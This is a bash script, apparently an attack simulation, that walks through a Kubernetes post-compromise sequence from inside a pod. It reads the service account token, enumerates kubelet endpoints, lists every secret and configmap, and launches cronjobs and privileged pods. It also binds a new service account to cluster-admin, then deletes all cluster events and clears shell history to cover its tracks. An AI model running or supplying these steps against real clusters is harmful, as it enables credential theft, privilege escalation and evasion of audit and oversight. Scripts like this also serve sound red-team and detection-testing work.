#!/bin/bash

whoami

#find out if in kubernetes
#k8s environment variables
env | grep -i kube
env

# SA token
ls -la /var/run/secrets/kubernetes.io/serviceaccount
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# command history
history

# network discovery
ip a

# download kubectl
curl -L https://storage.googleapis.com/kubernetes-release/release/v1.16.4/bin/linux/amd64/kubectl -o /tmp/kubectl
chmod +x /tmp/kubectl

# discover API server
curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version
/tmp/kubectl auth can-i --list --kubeconfig ./k8s_config

# try to find kubelet ip
# need to use either nmap or kubectl get nodes to find out
max=$[$(/tmp/kubectl get no -A --kubeconfig ./k8s_config | wc -l)-2]
for (( i=0; i<=$max; ++i ))
do
	ip_var=$(/tmp/kubectl get no -A --kubeconfig ./k8s_config -o=jsonpath="{.items[$i].status.addresses[0].address}")
	curl http://$ip_var:10255/pods
done

# list K8S Secrets&Configmaps
/tmp/kubectl get secrets -A --kubeconfig ./k8s_config
/tmp/kubectl get configmaps -A --kubeconfig ./k8s_config

# create new pod
/tmp/kubectl run nginx --image=nginx --generator=run-pod/v1 --kubeconfig ./k8s_config

# exec into pod 
sleep 15  # wait for pod to initiate before exec
/tmp/kubectl exec nginx sleep 1 --kubeconfig ./k8s_config

# kill pod nginx
/tmp/kubectl delete po nginx --kubeconfig ./k8s_config

# cronjob
/tmp/kubectl create -f ./cronjob.json --kubeconfig ./k8s_config
 
# delete cronjob
/tmp/kubectl delete -f ./cronjob.json --kubeconfig ./k8s_config

# local cron?

# run privileged pod
/tmp/kubectl create -f ./privileged_pod.yaml --kubeconfig ./k8s_config

# remove privileged pod
/tmp/kubectl delete -f ./privileged_pod.yaml --kubeconfig ./k8s_config

# create ServiceAccount
/tmp/kubectl create serviceaccount tester-sa --kubeconfig ./k8s_config

# bind tester-sa ServiceAccount to cluster-admin
/tmp/kubectl create -f ./clusterbind.json --kubeconfig ./k8s_config

# run pod with high permissions SA tester-sa
/tmp/kubectl create -f ./pod_priv_sa.yaml --kubeconfig ./k8s_config

# delete pod with high permissions SA tester-sa
/tmp/kubectl delete -f ./pod_priv_sa.yaml --kubeconfig ./k8s_config

# delete bind tester-sa ServiceAccount to cluster-admin
/tmp/kubectl delete -f ./clusterbind.json --kubeconfig ./k8s_config

# delete ServiceAccount
/tmp/kubectl delete serviceaccount tester-sa --kubeconfig ./k8s_config

# deletion of Kubernetes Events
/tmp/kubectl delete events --all --kubeconfig ./k8s_config

# clear command history
history -c
